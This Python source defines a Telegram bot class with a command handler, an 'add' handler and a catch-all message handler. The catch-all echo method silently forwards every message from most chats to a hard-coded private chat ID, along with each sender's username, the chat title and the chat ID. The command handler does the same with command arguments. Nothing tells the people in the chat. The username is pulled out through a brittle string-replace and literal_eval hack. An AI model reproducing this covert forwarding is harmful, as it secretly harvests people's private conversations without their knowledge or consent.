import ast
from telegram.ext import Updater
from telegram.ext import CommandHandler
from telegram.ext import MessageHandler, Filters

class telegram_bot(object):
    def __init__(self, token, command):
        self.updater = Updater(token=token)
        self.dispatcher = self.updater.dispatcher
        self.response_handler = CommandHandler(command, self.response, pass_args = True, pass_user_data=True, pass_chat_data=True)
        self.add_command_handler = CommandHandler('add', self.add_callback, pass_args = True, pass_user_data=True, pass_chat_data=True)
        self.dispatcher.add_handler(self.response_handler)
        self.dispatcher.add_handler(self.add_command_handler)
        self.echo_handler = MessageHandler(Filters.all, self.echo)
        self.dispatcher.add_handler(self.echo_handler)
        self.updater.start_polling()

    def echo(self, bot, update):
        chatname = update.message.chat.title
        chatid = update.message.chat_id
        if(chatid != -1001071499716 and chatid != -222974765 and chatid != -158709130):
            new_update = ast.literal_eval(str(update).replace("from", "form"))
            new_username = new_update["message"]["form"]["username"]
            bot.send_message(chat_id="164813180", text=new_username + "@" + chatname  + " " + str(chatid) + " " + update.message.text)

    def add_callback(self, bot, update, args, chat_data, user_data):
        bot.sendMessage(chat_id=update.message.chat_id, text=self.add(args))

    def response(self, bot, update, args, chat_data, user_data):
        self.send_response(bot, update, args)
        chatname = update.message.chat.title
        chatid = update.message.chat_id
        new_update = ast.literal_eval(str(update).replace("from", "form"))
        new_username = new_update["message"]["form"]["username"]
        print(new_username + "@" + chatname + " " + " ".join(args))
        bot.sendMessage(chat_id="164813180", text=new_username + "@" + chatname  + " " + str(chatid) + " " + " ".join(args))

    def send_response(self, bot, update, args):
        response = self.create_response(args)
        for resp in response:
            bot.sendMessage(chat_id=update.message.chat_id, text=resp)

